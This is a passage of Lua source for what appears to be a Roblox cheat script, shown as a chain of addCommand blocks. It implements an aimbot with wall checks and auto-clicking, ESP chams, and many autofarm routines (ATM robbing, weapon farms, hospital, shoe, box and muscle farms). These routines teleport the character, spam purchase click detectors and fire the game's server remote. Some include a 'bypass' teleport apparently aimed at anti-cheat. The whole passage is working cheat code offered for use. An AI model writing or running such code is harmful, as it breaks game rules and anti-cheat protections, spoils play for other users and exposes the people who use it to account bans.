							DebugMenu["PlayerPosition"].Text = "Position: (X: " .. string.format("%.3f", Pos.X) .. " Y: " .. string.format("%.3f", Pos.Y) .. " Z: " .. string.format("%.3f", Pos.Z) .. ") Distance: " .. string.format("%.0f", Dist) .. " Studs"

							local MyCharStuff = MyChar:GetDescendants()
							local GetCharStuff = GetChar:GetDescendants()
							for _, v in next, GetCharStuff do
								if v ~= GetTor then
									table.insert(MyCharStuff, v)
								end
							end
							local Ray = Ray.new(MyTor.Position, (Pos - MyTor.Position).unit * 300)
							local part = workspace:FindPartOnRayWithIgnoreList(Ray, MyCharStuff)
							if part == GetTor then
								DebugMenu["BehindWall"].Text = "Behind Wall: false"
							else
								DebugMenu["BehindWall"].Text = "Behind Wall: true"
							end

							DebugMenu["Main"].Size = UDim2.new(0, DebugMenu["PlayerPosition"].TextBounds.X, 0, 200)
						end
					end

					-- My Position
					if MyTor then
						local Pos = MyTor.Position
						DebugMenu["Position"].Text = "My Position: (X: " .. string.format("%.3f", Pos.x) .. " Y: " .. string.format("%.3f", Pos.Y) .. " Z: " .. string.format("%.3f", Pos.Z) .. ")"
					end

					-- FPS
					local fps = math.floor(.5 + (1 / (tick() - LastTick)))
					local sum = 0
					local ave = 0
					table.insert(Bullshit.FPSAverage, fps)
					for i = 1, #Bullshit.FPSAverage do
						sum = sum + Bullshit.FPSAverage[i]
					end
					DebugMenu["FPS"].Text = "FPS: " .. tostring(fps) .. " Average: " .. string.format("%.0f", (sum / #Bullshit.FPSAverage))
					if (tick() - LastTick) >= 15 then
						Bullshit.FPSAverage = { }
						LastTick = tick()
					end
					LastTick = tick()
				end
			end)

			Run:BindToRenderStep("Aimbot", Enum.RenderPriority.First.Value, function()
				ClosestEnemy = GetClosestPlayerNotBehindWall()
				if Bullshit.AimbotEnabled and Bullshit.Aimbot then
					if ClosestEnemy ~= nil then
						local GetChar = ClosestEnemy.Character
						if MyChar and GetChar then
							local MyCharStuff = MyChar:GetDescendants()
							local MyHead = MyChar:FindFirstChild("Head")
							local MyTor = MyChar:FindFirstChild("HumanoidRootPart")
							local MyHum = MyChar:FindFirstChild("Humanoid")
							local GetHead = GetChar:FindFirstChild("Head")
							local GetTor = GetChar:FindFirstChild("HumanoidRootPart")
							local GetHum = GetChar:FindFirstChild("Humanoid")
							if MyHead and MyTor and MyHum and GetHead and GetTor and GetHum then
								if MyHum.Health > 1 and (GetHum.Health > 1 and not GetChar:FindFirstChild("KO")) then
									MyPlr.CameraMode = Enum.CameraMode.LockFirstPerson
									MyCam.CFrame = CFrame.new(MyHead.CFrame.p, GetHead.CFrame.p)
									if Bullshit.AutoFire then
										mouse1click() -- >:(
									end
								end
							end
						end
					end
				else
					MyPlr.CameraMode = Bullshit.CameraModeBackup
				end
			end)

			local succ, out = coroutine.resume(coroutine.create(function()
				while true do
					for _, v in next, Plrs:GetPlayers() do
						UpdateChams(v)
						Run.RenderStepped:wait()
					end
				end
			end))

			if not succ then
				error(out)
			end
		end;
	});

	addCommand({
		["Name"] = "autofarm";
		["Function"] = function()
			while true do
				for N, O in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
					if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - O.Position).Magnitude <= 50 then
						local P = O;
						J(game.Players.LocalPlayer.Character.HumanoidRootPart, O)
						wait()
					end
				end;
				if not game.Players.LocalPlayer.Character:FindFirstChild("Combat") then
					local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("Combat")
					tool.Parent = game.Players.LocalPlayer.Character
				end;
				wait()
				for s, Q in pairs(game.Workspace.Cashiers:GetChildren()) do
					wait()
					if Q:FindFirstChild("Humanoid") then
						if Q.Humanoid.Health > 0 then
							wait()
							if Q.Name ~= "CASHIER5" then
								Q.Wedge.Orientation = Vector3.new(0, 90, 0)
								Q.Wedge.Size = Vector3.new(4, 4, 4)
								Q.Wedge.CanCollide = false
							end;
							if Q.Name == "CASHIER5" then
								Q.Wedge.Orientation = Vector3.new(0, 180, 0)
								Q.Wedge.Size = Vector3.new(4, 4, 4)
								Q.Wedge.CanCollide = false
							end;
							wait()
							poss = Q.Wedge.Position - Vector3.new(0, 0, 0)
							posc = Q.Wedge.CFrame - Vector3.new(-2.5, 0, 0)
							toTarget(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position, poss, posc)
							repeat
								wait()
							until (game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - poss).Magnitude < 50 or Q.Humanoid.Health <= 0;
							repeat
								if not game.Players.LocalPlayer.Character:FindFirstChild("Combat") then
									local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("Combat")
									tool.Parent = game.Players.LocalPlayer.Character
								end;
								toTarget(game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position, poss, posc)
								wait(.2)
								game:GetService("VirtualUser"):Button1Down(Vector2.new())
							until Q.Humanoid.Health <= 0;
							wait(.2)
							for R = 5, 50 do
								wait()
								for N, O in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
									if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - O.Position).Magnitude <= 50 then
										if O:IsA("Part") then
											local P = O;
											J(game.Players.LocalPlayer.Character.HumanoidRootPart, O)
											wait()
										end
									end
								end
							end
						end
					end
				end
			end
		end;
	});

	addCommand({
		["Name"] = "p90farm";
		["Function"] = function()
			repeat
				wait()
			until game:IsLoaded()

			if workspace.Players[game.Players.LocalPlayer.Name]:FindFirstChild("[P90]") then
				workspace.Players[game.Players.LocalPlayer.Name]:FindFirstChild("[P90]").Name = "[P900]"
			else
				game.Players.LocalPlayer.Backpack["[P90]"].Parent = workspace.Players[game.Players.LocalPlayer.Name]
				game.workspace.Players[game.Players.LocalPlayer.Name]:FindFirstChild("[P90]").Name = "[P900]"
			end

			function Buy()
				fireclickdetector(workspace.Ignored.Shop["120 [P90 Ammo] - $60"].ClickDetector)
			end

			local timer = 0
			local ATM = "nil"
			local GetAmmoOrReload = false
			local Cash = false

			function GetCash()
				for i, v in pairs(workspace.Ignored.Drop:GetChildren()) do
					if
						v.Name == "MoneyDrop" and
							(workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.Position - v.Position).Magnitude < 12
					then
						Cash = true
						fireclickdetector(v.ClickDetector)
						wait(1)
						Cash = false
					end
				end
			end

			function getATM()
				for i, v in pairs(workspace.Cashiers:GetChildren()) do
					if v:WaitForChild("Humanoid").Health > 0 then
						local cf = v.Head.CFrame
						local lv = cf.lookVector
						game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
							cf + (lv * Vector3.new(0, 0, -3))
						game.ReplicatedStorage.MainEvent:FireServer("UpdateMousePos", v.Head.Position)
						return v
					end
				end
			end

			ATM = getATM()

			function reload(name, gun)
				local A_1 = "Reload"
				local A_2 = game:GetService("Workspace").Players[name][gun]
				local Event = game:GetService("ReplicatedStorage").MainEvent
				Event:FireServer(A_1, A_2)
			end

			game:GetService("RunService").Heartbeat:Connect(
			function()
				GetCash()
				game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
				if timer == 0 and Cash == false then
					if game.Players.LocalPlayer.DataFolder.Inventory["[P90]"].Value == "0" and GetAmmoOrReload == false then
						timer = 10
						GetAmmoOrReload = true
						local part = workspace.Ignored.Shop["120 [P90 Ammo] - $60"].Head
						game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
							CFrame.new(part.CFrame.X, part.CFrame.Y + 4, part.CFrame.Z)
						game.workspace.Players[game.Players.LocalPlayer.Name]["[P900]"].Parent =
							game.Players.LocalPlayer.Backpack
						wait(2)
						for i = 1, 10 do
							game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
								CFrame.new(
									part.CFrame.X + math.random(1, 2),
									part.CFrame.Y + math.random(1, 2),
									part.CFrame.Z + math.random(1, 2)
								)
							print "e"
							Buy()
							wait(1)
						end
						game.Players.LocalPlayer.Backpack["[P900]"].Parent =
							game.workspace.Players[game.Players.LocalPlayer.Name]
						timer = 0
						GetAmmoOrReload = false
						local cf = ATM.Head.CFrame
						local lv = cf.lookVector
						game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
							cf + (lv * Vector3.new(0, 0, -3))
					end
					if
						game.workspace.Players[game.Players.LocalPlayer.Name]:WaitForChild("[P900]").Ammo.Value == 0 and
							GetAmmoOrReload == false
					then
						GetAmmoOrReload = true
						reload(game.Players.LocalPlayer.Name, "[P900]")
						wait(2)
						GetAmmoOrReload = false
					else
						for i, v in pairs(workspace.Cashiers:GetChildren()) do
							if v:WaitForChild("Humanoid").Health > 0 then
								if GetAmmoOrReload == false then
									if ATM.Humanoid.Health > 0 then
										game:GetService("VirtualUser"):Button1Down(Vector2.new(0, 0, 0))
										local cf = ATM.Head.CFrame
										local lv = cf.lookVector
										game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
											cf + (lv * Vector3.new(0, 0, -3))
									end
								end
							end
						end
					end
					for i, v in pairs(workspace.Cashiers:GetChildren()) do
						if v:WaitForChild("Humanoid").Health > 0 then
							if ATM.Humanoid.Health < 0 and GetAmmoOrReload == false then
								timer = 10
								wait(0.1)
								if GetAmmoOrReload == false then
									local cf = ATM.Head.CFrame
									local lv = cf.lookVector
									game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
										cf + (lv * Vector3.new(0, 0, -3))

									ATM = getATM()
								end
								timer = 0
							end
						end
					end
				end
			end
			)
		end;
	});

	addCommand({
		["Name"] = "shotgunfarm";
		["Function"] = function()
			if game.Players.LocalPlayer.Character.Animate:FindFirstChild("idle") then
				game.Players.LocalPlayer.Character.Animate.idle:Destroy()
			end
			local me = game:service'Players'.LocalPlayer
			local plr = game.Players.LocalPlayer
			local savedarmourpos = plr.Character.HumanoidRootPart.Position
			local toolname = "[Shotgun] - $1250"
			plr.Character.HumanoidRootPart.CFrame = CFrame.new(game.Workspace.Ignored.Shop[toolname].Head.Position)
			wait(.1)
			fireclickdetector(game.Workspace.Ignored.Shop[toolname].ClickDetector)
			wait(.1)
			fireclickdetector(game.Workspace.Ignored.Shop[toolname].ClickDetector)
			wait(.1)
			fireclickdetector(game.Workspace.Ignored.Shop[toolname].ClickDetector)
			wait(.1)
			fireclickdetector(game.Workspace.Ignored.Shop[toolname].ClickDetector)
			wait(.1)
			fireclickdetector(game.Workspace.Ignored.Shop[toolname].ClickDetector)
			wait(.1)
			fireclickdetector(game.Workspace.Ignored.Shop[toolname].ClickDetector)
			wait(.1)
			me.Character.Humanoid:EquipTool(me.Backpack:FindFirstChild("[Shotgun]"))
			wait(0.001)
			plr.Character.HumanoidRootPart.CFrame = CFrame.new(savedarmourpos)
			plr.Character.HumanoidRootPart.CFrame = CFrame.new(savedarmourpos)
			function bypass()
				local oh1 = CFrame.new(-346.434296, 52.5954704, 446.756989)
				local oh2 = game:GetService("Players")
				local oh3 = oh2.LocalPlayer.Character.HumanoidRootPart


				oh3.CFrame = oh1
				wait(1.5)
			end
			repeat
				wait()
			until game:IsLoaded()

			if workspace.Players[game.Players.LocalPlayer.Name]:FindFirstChild("[Shotgun]") then
				workspace.Players[game.Players.LocalPlayer.Name]:FindFirstChild("[Shotgun]").Name = "[Drxco]"

				function Buy()
					fireclickdetector(workspace.Ignored.Shop["20 [Shotgun Ammo] - $60"].ClickDetector)
					fireclickdetector(workspace.Ignored.Shop["20 [Shotgun Ammo] - $60"].ClickDetector)
				end

				local ATM = "nil"
				local idk = false
				local dineros = false
				local lol = 0

				function GetATM()
					bypass()
					for i, v in pairs(workspace.Cashiers:GetChildren()) do
						if v:WaitForChild("Humanoid").Health > 0 then
							local cf = v.Open.CFrame
							local lv = cf.lookVector
							game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame = cf + (lv * Vector3.new(0, 0, -2))
							game.ReplicatedStorage.MainEvent:FireServer("UpdateMousePos", v.Open.Position)
							return v
						end
					end
				end

				function GETMONEY()
					for i, v in pairs(workspace.Ignored.Drop:GetChildren()) do
						if v.Name == "MoneyDrop" and (workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.Position - v.Position).Magnitude < 25
						then
							dineros = true
							fireclickdetector(v.ClickDetector)
							wait(0.7)
							dineros = false
						end
					end
				end

				ATM = GetATM()

				function reload(name, gun)
					local XD1 = "Reload"
					local XD2 = game:GetService("Workspace").Players[name][gun]
					local Event = game:GetService("ReplicatedStorage").MainEvent
					Event:FireServer(XD1, XD2)
				end
				game:GetService("RunService").Heartbeat:Connect(function()
					GETMONEY()
					game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
					if lol == 0 and dineros == false then
						if game.Players.LocalPlayer.DataFolder.Inventory["[Shotgun]"].Value == "0" and idk == false then
							lol = 10
							idk = true
							local part = workspace.Ignored.Shop["20 [Shotgun Ammo] - $60"].Head
							game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
								CFrame.new(part.CFrame.X, part.CFrame.Y + 4, part.CFrame.Z)
							game.workspace.Players[game.Players.LocalPlayer.Name]["[Drxco]"].Parent =
								game.Players.LocalPlayer.Backpack
							wait(2)
							for i = 1, 10 do
								game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
									CFrame.new(
										part.CFrame.X + math.random(1, 2),
										part.CFrame.Y + math.random(1, 2),
										part.CFrame.Z + math.random(1, 2)
									)
								Buy()
								wait(0.5)
							end
							game.Players.LocalPlayer.Backpack["[Drxco]"].Parent =
								game.workspace.Players[game.Players.LocalPlayer.Name]
							lol = 0
							idk = false
							local cf = ATM.Open.CFrame
							local lv = cf.lookVector
							game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
								cf + (lv * Vector3.new(0, 0, -2))
						end
						if
							game.workspace.Players[game.Players.LocalPlayer.Name]:WaitForChild("[Drxco]").Ammo.Value == 4 and
								idk == false
						then
							idk = true
							reload(game.Players.LocalPlayer.Name, "[Drxco]")
							wait(0.5)
							idk = false
						else
							for i, v in pairs(workspace.Cashiers:GetChildren()) do
								if v:WaitForChild("Humanoid").Health > 0 then
									if idk == false then
										if ATM.Humanoid.Health > 0 then
											game:GetService("VirtualUser"):Button1Down(Vector2.new(0, 0, 0))
											local cf = ATM.Open.CFrame
											local lv = cf.lookVector
											game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
												cf + (lv * Vector3.new(0, 0, -2))
										end
									end
								end
							end
						end
						for i, v in pairs(workspace.Cashiers:GetChildren()) do
							if v:WaitForChild("Humanoid").Health > 0 then
								if ATM.Humanoid.Health < 0 and idk == false then
									lol = 10
									wait(0.1)
									if idk == false then
										local cf = ATM.Open.CFrame
										local lv = cf.lookVector
										game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
											cf + (lv * Vector3.new(0, 0, -2))

										ATM = GetATM()
									end
									lol = 0
								end
							end
						end
					end
				end)
			end
		end;
	});

	addCommand({
		["Name"] = "shottyfarm";
		["Function"] = function()
			if game.Players.LocalPlayer.Character.Animate:FindFirstChild("idle") then
				game.Players.LocalPlayer.Character.Animate.idle:Destroy()
			end
			local me = game:service'Players'.LocalPlayer
			local plr = game.Players.LocalPlayer
			local savedarmourpos = plr.Character.HumanoidRootPart.Position
			local toolname = "[Shotgun] - $1250"
			plr.Character.HumanoidRootPart.CFrame = CFrame.new(game.Workspace.Ignored.Shop[toolname].Head.Position)
			wait(.1)
			fireclickdetector(game.Workspace.Ignored.Shop[toolname].ClickDetector)
			wait(.1)
			fireclickdetector(game.Workspace.Ignored.Shop[toolname].ClickDetector)
			wait(.1)
			fireclickdetector(game.Workspace.Ignored.Shop[toolname].ClickDetector)
			wait(.1)
			fireclickdetector(game.Workspace.Ignored.Shop[toolname].ClickDetector)
			wait(.1)
			fireclickdetector(game.Workspace.Ignored.Shop[toolname].ClickDetector)
			wait(.1)
			fireclickdetector(game.Workspace.Ignored.Shop[toolname].ClickDetector)
			wait(.1)
			me.Character.Humanoid:EquipTool(me.Backpack:FindFirstChild("[Shotgun]"))
			wait(0.001)
			plr.Character.HumanoidRootPart.CFrame = CFrame.new(savedarmourpos)
			plr.Character.HumanoidRootPart.CFrame = CFrame.new(savedarmourpos)
			function bypass()
				local oh1 = CFrame.new(-346.434296, 52.5954704, 446.756989)
				local oh2 = game:GetService("Players")
				local oh3 = oh2.LocalPlayer.Character.HumanoidRootPart


				oh3.CFrame = oh1
				wait(1.5)
			end
			repeat
				wait()
			until game:IsLoaded()

			if workspace.Players[game.Players.LocalPlayer.Name]:FindFirstChild("[Shotgun]") then
				workspace.Players[game.Players.LocalPlayer.Name]:FindFirstChild("[Shotgun]").Name = "[Drxco]"

				function Buy()
					fireclickdetector(workspace.Ignored.Shop["20 [Shotgun Ammo] - $60"].ClickDetector)
					fireclickdetector(workspace.Ignored.Shop["20 [Shotgun Ammo] - $60"].ClickDetector)
				end

				local ATM = "nil"
				local idk = false
				local dineros = false
				local lol = 0

				function GetATM()
					bypass()
					for i, v in pairs(workspace.Cashiers:GetChildren()) do
						if v:WaitForChild("Humanoid").Health > 0 then
							local cf = v.Open.CFrame
							local lv = cf.lookVector
							game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame = cf + (lv * Vector3.new(0, 0, -2))
							game.ReplicatedStorage.MainEvent:FireServer("UpdateMousePos", v.Open.Position)
							return v
						end
					end
				end

				function GETMONEY()
					for i, v in pairs(workspace.Ignored.Drop:GetChildren()) do
						if v.Name == "MoneyDrop" and (workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.Position - v.Position).Magnitude < 25
						then
							dineros = true
							fireclickdetector(v.ClickDetector)
							wait(0.7)
							dineros = false
						end
					end
				end

				ATM = GetATM()

				function reload(name, gun)
					local XD1 = "Reload"
					local XD2 = game:GetService("Workspace").Players[name][gun]
					local Event = game:GetService("ReplicatedStorage").MainEvent
					Event:FireServer(XD1, XD2)
				end
				game:GetService("RunService").Heartbeat:Connect(function()
					GETMONEY()
					game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
					if lol == 0 and dineros == false then
						if game.Players.LocalPlayer.DataFolder.Inventory["[Shotgun]"].Value == "0" and idk == false then
							lol = 10
							idk = true
							local part = workspace.Ignored.Shop["20 [Shotgun Ammo] - $60"].Head
							game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
								CFrame.new(part.CFrame.X, part.CFrame.Y + 4, part.CFrame.Z)
							game.workspace.Players[game.Players.LocalPlayer.Name]["[Drxco]"].Parent =
								game.Players.LocalPlayer.Backpack
							wait(2)
							for i = 1, 10 do
								game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
									CFrame.new(
										part.CFrame.X + math.random(1, 2),
										part.CFrame.Y + math.random(1, 2),
										part.CFrame.Z + math.random(1, 2)
									)
								Buy()
								wait(0.5)
							end
							game.Players.LocalPlayer.Backpack["[Drxco]"].Parent =
								game.workspace.Players[game.Players.LocalPlayer.Name]
							lol = 0
							idk = false
							local cf = ATM.Open.CFrame
							local lv = cf.lookVector
							game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
								cf + (lv * Vector3.new(0, 0, -2))
						end
						if
							game.workspace.Players[game.Players.LocalPlayer.Name]:WaitForChild("[Drxco]").Ammo.Value == 4 and
								idk == false
						then
							idk = true
							reload(game.Players.LocalPlayer.Name, "[Drxco]")
							wait(0.5)
							idk = false
						else
							for i, v in pairs(workspace.Cashiers:GetChildren()) do
								if v:WaitForChild("Humanoid").Health > 0 then
									if idk == false then
										if ATM.Humanoid.Health > 0 then
											game:GetService("VirtualUser"):Button1Down(Vector2.new(0, 0, 0))
											local cf = ATM.Open.CFrame
											local lv = cf.lookVector
											game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
												cf + (lv * Vector3.new(0, 0, -2))
										end
									end
								end
							end
						end
						for i, v in pairs(workspace.Cashiers:GetChildren()) do
							if v:WaitForChild("Humanoid").Health > 0 then
								if ATM.Humanoid.Health < 0 and idk == false then
									lol = 10
									wait(0.1)
									if idk == false then
										local cf = ATM.Open.CFrame
										local lv = cf.lookVector
										game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
											cf + (lv * Vector3.new(0, 0, -2))

										ATM = GetATM()
									end
									lol = 0
								end
							end
						end
					end
				end)
			end
		end;
	});

	addCommand({
		["Name"] = "silencerfarm";
		["Function"] = function()
			if game.Players.LocalPlayer.Character.Animate:FindFirstChild("idle") then
				game.Players.LocalPlayer.Character.Animate.idle:Destroy()
			end
			local me = game:service'Players'.LocalPlayer
			local plr = game.Players.LocalPlayer
			local savedarmourpos = plr.Character.HumanoidRootPart.Position
			local toolname = "[Silencer] - $400"
			plr.Character.HumanoidRootPart.CFrame = CFrame.new(game.Workspace.Ignored.Shop[toolname].Head.Position)
			wait(.1)
			fireclickdetector(game.Workspace.Ignored.Shop[toolname].ClickDetector)
			wait(.1)
			fireclickdetector(game.Workspace.Ignored.Shop[toolname].ClickDetector)
			wait(.1)
			fireclickdetector(game.Workspace.Ignored.Shop[toolname].ClickDetector)
			wait(.1)
			fireclickdetector(game.Workspace.Ignored.Shop[toolname].ClickDetector)
			wait(.1)
			fireclickdetector(game.Workspace.Ignored.Shop[toolname].ClickDetector)
			wait(.1)
			fireclickdetector(game.Workspace.Ignored.Shop[toolname].ClickDetector)
			wait(.1)
			me.Character.Humanoid:EquipTool(me.Backpack:FindFirstChild("[Silencer]"))
			wait(0.001)
			plr.Character.HumanoidRootPart.CFrame = CFrame.new(savedarmourpos)
			plr.Character.HumanoidRootPart.CFrame = CFrame.new(savedarmourpos)
			function bypass()
				local oh1 = CFrame.new(-346.434296, 52.5954704, 446.756989)
				local oh2 = game:GetService("Players")
				local oh3 = oh2.LocalPlayer.Character.HumanoidRootPart


				oh3.CFrame = oh1
				wait(1.5)
			end
			repeat
				wait()
			until game:IsLoaded()

			if workspace.Players[game.Players.LocalPlayer.Name]:FindFirstChild("[Silencer]") then
				workspace.Players[game.Players.LocalPlayer.Name]:FindFirstChild("[Silencer]").Name = "[Drxco]"

				function Buy()
					fireclickdetector(workspace.Ignored.Shop["25 [Silencer Ammo] - $50"].ClickDetector)
					fireclickdetector(workspace.Ignored.Shop["25 [Silencer Ammo] - $50"].ClickDetector)
				end

				local ATM = "nil"
				local idk = false
				local dineros = false
				local lol = 0

				function GetATM()
					bypass()
					for i, v in pairs(workspace.Cashiers:GetChildren()) do
						if v:WaitForChild("Humanoid").Health > 0 then
							local cf = v.Open.CFrame
							local lv = cf.lookVector
							game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame = cf + (lv * Vector3.new(0, 0, -2))
							game.ReplicatedStorage.MainEvent:FireServer("UpdateMousePos", v.Open.Position)
							return v
						end
					end
				end

				function GETMONEY()
					for i, v in pairs(workspace.Ignored.Drop:GetChildren()) do
						if v.Name == "MoneyDrop" and (workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.Position - v.Position).Magnitude < 25
						then
							dineros = true
							fireclickdetector(v.ClickDetector)
							wait(0.7)
							dineros = false
						end
					end
				end

				ATM = GetATM()

				function reload(name, gun)
					local XD1 = "Reload"
					local XD2 = game:GetService("Workspace").Players[name][gun]
					local Event = game:GetService("ReplicatedStorage").MainEvent
					Event:FireServer(XD1, XD2)
				end
				game:GetService("RunService").Heartbeat:Connect(function()
					GETMONEY()
					game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
					if lol == 0 and dineros == false then
						if game.Players.LocalPlayer.DataFolder.Inventory["[Silencer]"].Value == "0" and idk == false then
							lol = 10
							idk = true
							local part = workspace.Ignored.Shop["25 [Silencer Ammo] - $50"].Head
							game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
								CFrame.new(part.CFrame.X, part.CFrame.Y + 4, part.CFrame.Z)
							game.workspace.Players[game.Players.LocalPlayer.Name]["[Drxco]"].Parent =
								game.Players.LocalPlayer.Backpack
							wait(2)
							for i = 1, 10 do
								game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
									CFrame.new(
										part.CFrame.X + math.random(1, 2),
										part.CFrame.Y + math.random(1, 2),
										part.CFrame.Z + math.random(1, 2)
									)
								Buy()
								wait(0.5)
							end
							game.Players.LocalPlayer.Backpack["[Drxco]"].Parent =
								game.workspace.Players[game.Players.LocalPlayer.Name]
							lol = 0
							idk = false
							local cf = ATM.Open.CFrame
							local lv = cf.lookVector
							game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
								cf + (lv * Vector3.new(0, 0, -2))
						end
						if
							game.workspace.Players[game.Players.LocalPlayer.Name]:WaitForChild("[Drxco]").Ammo.Value == 4 and
								idk == false
						then
							idk = true
							reload(game.Players.LocalPlayer.Name, "[Drxco]")
							wait(0.5)
							idk = false
						else
							for i, v in pairs(workspace.Cashiers:GetChildren()) do
								if v:WaitForChild("Humanoid").Health > 0 then
									if idk == false then
										if ATM.Humanoid.Health > 0 then
											game:GetService("VirtualUser"):Button1Down(Vector2.new(0, 0, 0))
											local cf = ATM.Open.CFrame
											local lv = cf.lookVector
											game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
												cf + (lv * Vector3.new(0, 0, -2))
										end
									end
								end
							end
						end
						for i, v in pairs(workspace.Cashiers:GetChildren()) do
							if v:WaitForChild("Humanoid").Health > 0 then
								if ATM.Humanoid.Health < 0 and idk == false then
									lol = 10
									wait(0.1)
									if idk == false then
										local cf = ATM.Open.CFrame
										local lv = cf.lookVector
										game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
											cf + (lv * Vector3.new(0, 0, -2))

										ATM = GetATM()
									end
									lol = 0
								end
							end
						end
					end
				end)
			end
		end;
	});

	addCommand({
		["Name"] = "hospitalfarm";
		["Function"] = function()
			game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(116.618, 22.799, -479.274)
			local job = game:GetService("Workspace").Ignored.HospitalJob
			while true do
				wait(3)
				if job:FindFirstChild('Can I get the Red bottle') then 
					fireclickdetector(game:GetService("Workspace").Ignored.HospitalJob.Red.ClickDetector)
					wait(.1)
					fireclickdetector(game:GetService("Workspace").Ignored.HospitalJob["Can I get the Red bottle"].ClickDetector)

				elseif job:FindFirstChild('Can I get the Green bottle') then
					fireclickdetector(game:GetService("Workspace").Ignored.HospitalJob.Green.ClickDetector)
					wait(.1)
					fireclickdetector(game:GetService("Workspace").Ignored.HospitalJob["Can I get the Green bottle"].ClickDetector)
				elseif job:FindFirstChild('Can I get the Blue bottle') then
					fireclickdetector(game:GetService("Workspace").Ignored.HospitalJob.Blue.ClickDetector)
					wait(.1)
					fireclickdetector(game:GetService("Workspace").Ignored.HospitalJob["Can I get the Blue bottle"].ClickDetector)

				end
			end 
		end;
	});

	addCommand({
		["Name"] = "shoefarm";
		["Function"] = function()
			game.RunService.Stepped:Connect(function()
				fireclickdetector(game:GetService("Workspace").Ignored["Clean the shoes on the floor and come to me for cash"].ClickDetector)
				for i, v in pairs(workspace.Ignored.Drop:GetChildren()) do
					if v.Transparency == 0 and v:IsA("MeshPart") then
						game.Players.LocalPlayer.Character.HumanoidRootPart.Position = v.Position
						wait()
						fireclickdetector(v.ClickDetector)
					end
				end
			end)
		end;
	});

	addCommand({
		["Name"] = "boxfarm";
		["Function"] = function()
			while true do
				wait()
				if not game.Players.LocalPlayer.Character:FindFirstChild("Combat") then
					local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("Combat")
					tool.Parent = game.Players.LocalPlayer.Character
				end;
				for V, W in pairs(game.Workspace.MAP.Map.ArenaBOX:GetChildren()) do
					wait()
					warn(W)
					if W.Name == "PunchingBagInGame" then
						wait()
						posMx = W:FindFirstChild("pretty ransom").Position - Vector3.new(0, 0, 0)
						poscMx = W:FindFirstChild("pretty ransom").CFrame - Vector3.new(3, 0, 0)
						ToShoes(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position, posMx, poscMx)
						while true do
							if not game.Players.LocalPlayer.Character:FindFirstChild("Combat") then
								local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("Combat")
								tool.Parent = game.Players.LocalPlayer.Character
							end;
							ToShoes(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position, posMx, poscMx)
							wait(.5)
							game:GetService("VirtualUser"):ClickButton1(Vector2.new())
						end
					end
				end
			end
		end;
	});

	addCommand({
		["Name"] = "musclefarm";
		["Function"] = function()
			while true do
				wait()
				if not game.Players.LocalPlayer.Character:FindFirstChild("[HeavyWeights]") then
					wait()
					local k = game.Workspace.Ignored.Shop["[HeavyWeights] - $250"]
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
					if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
						wait(.8)
						fireclickdetector(k:FindFirstChild("ClickDetector"), 4)
					end
				end;
				if not game.Players.LocalPlayer.Character:FindFirstChild("[HeavyWeights]") then
					tool = game.Players.LocalPlayer.Backpack:WaitForChild("[HeavyWeights]")
					tool.Parent = game.Players.LocalPlayer.Character
				end;
				game:GetService("VirtualUser"):ClickButton1(Vector2.new())
				local d = Vector3.new(-1006.99, -51.1542, -1014.33)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
			end
		end;
	});


	addCommand({
		["Name"] = "btools";
		["Function"] = function()
			sendNotif("", "Btools Enabled.", 15);
			local tool1 = Instance.new("HopperBin", game:GetService("Players").LocalPlayer.Backpack)
